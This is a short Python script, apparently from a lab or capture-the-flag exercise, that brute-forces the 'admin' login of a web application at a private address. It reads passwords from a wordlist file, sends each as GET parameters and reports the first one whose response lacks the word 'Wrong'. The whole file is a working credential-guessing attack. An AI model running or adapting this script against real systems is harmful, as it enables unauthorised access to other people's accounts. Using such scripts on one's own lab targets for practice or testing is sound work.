import requests

url = "http://192.168.56.102"
usernames = ["admin"]
passwords = open("passwords.txt", "r").readlines()

for password in passwords:
    password = password.strip()
    params = {'page': 'signin', 'username': 'admin', 'password': password, 'Login': 'Login'}
    
    response = requests.get(url, params=params)
    print(f"Checking: {password}")
    if "Wrong" not in response.text:
        print(f"[+] FOUND: {password}")
        break
